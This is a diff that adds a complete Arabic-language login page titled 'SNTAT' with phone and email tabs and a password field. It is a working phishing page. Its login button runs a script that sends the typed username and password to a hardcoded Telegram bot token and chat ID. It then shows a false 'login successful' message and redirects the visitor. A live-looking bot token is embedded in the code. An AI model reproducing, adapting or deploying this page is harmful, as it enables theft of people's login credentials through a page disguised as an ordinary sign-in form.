@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - SNTAT</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background: #f0f4f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #0072ff;
+            font-size: 24px;
+        }
+        .toggle-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .toggle-buttons button {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #0072ff;
+            background: transparent;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 10px;
+            color: #0072ff;
+            transition: background 0.3s, color 0.3s;
+            margin: 0 5px;
+        }
+        .toggle-buttons button.active {
+            background: #0072ff;
+            color: white;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: right;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            border-color: #0072ff;
+            outline: none;
+        }
+        .password-toggle {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        button.submit {
+            width: 100%;
+            padding: 14px;
+            background: #0072ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+        button.submit:hover {
+            background: #005bb5;
+        }
+        .social-login {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+        .social-login i {
+            font-size: 28px;
+            cursor: pointer;
+            color: #0072ff;
+            transition: color 0.3s;
+        }
+        .social-login i:hover {
+            color: #005bb5;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #0072ff;
+        }
+        .footer a {
+            text-decoration: none;
+            color: #0072ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <div class="toggle-buttons">
+            <button id="phone-tab" class="active">رقم الهاتف</button>
+            <button id="email-tab">البريد الإلكتروني</button>
+        </div>
+        <div class="input-group">
+            <input type="text" id="username" placeholder="رقم الهاتف" required oninput="validateInput()" inputmode="numeric">
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <i class="fa fa-eye password-toggle" onclick="togglePassword()"></i>
+        </div>
+        <button class="submit" onclick="sendToTelegram()">تسجيل الدخول</button>
+        <div class="social-login">
+            <i class="fab fa-google"></i>
+            <i class="fab fa-facebook"></i>
+        </div>
+        <div class="footer">
+            <a href="#">نسيت كلمة المرور؟</a>
+        </div>
+    </div>
+    <script>
+        let loginMode = "phone";
+        document.getElementById("phone-tab").addEventListener("click", function() {
+            this.classList.add("active");
+            document.getElementById("email-tab").classList.remove("active");
+            let input = document.getElementById("username");
+            input.type = "text";
+            input.placeholder = "رقم الهاتف";
+            input.value = "";
+            loginMode = "phone";
+        });
+        document.getElementById("email-tab").addEventListener("click", function() {
+            this.classList.add("active");
+            document.getElementById("phone-tab").classList.remove("active");
+            let input = document.getElementById("username");
+            input.type = "email";
+            input.placeholder = "البريد الإلكتروني";
+            input.value = "";
+            loginMode = "email";
+        });
+
+        function validateInput() {
+            let input = document.getElementById("username");
+            if (loginMode === "phone") {
+                input.value = input.value.replace(/\D/g, ''); 
+                if (input.value.length > 11) {
+                    input.value = input.value.slice(0, 11);
+                }
+            } else {
+                input.setCustomValidity(input.value.includes("@") ? "" : "يرجى إدخال بريد إلكتروني صالح");
+            }
+        }
+
+        function togglePassword() {
+            let passwordInput = document.getElementById("password");
+            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+        }
+
+        function sendToTelegram() {
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            let identifier = loginMode === "phone" ? "📱 رقم الهاتف" : "✉️ البريد الإلكتروني";
+
+            if (loginMode === "phone" && username.length !== 11) {
+                alert("يرجى ادخال معلومات صحيحة");
+                return;
+            }
+
+            if (loginMode === "email" && !document.getElementById("username").checkValidity()) {
+                alert("يرجى ادخال معلومات صحيحة");
+                return;
+            }
+
+            let botToken = "7907253214:AAECNLB6w5_7RmInG6Ja5ImBBKGEi57q4ww"; // ضع التوكن الصحيح هنا
+            let chatId = "6271227485"; // ضع رقم المحادثة الصحيح هنا
+            let message = `🔹 تسجيل دخول جديد:\n\n${identifier}: ${username}\n🔒 كلمة المرور: ${password}`;
+
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert(" تم تسجيل الدخول بنجاح");
+                    window.location.href = "index6.html"; // عدل الصفحة حسب الحاجة
+                } else {
+                    alert("حدث خطأ أثناء الإرسال.");
+                }
+            }).catch(error => {
+                alert("يرجى الاتصال بلأنترنت والمحاولة مره اخرى");
+            });
+        }
+    </script>
+</body>
+</html>
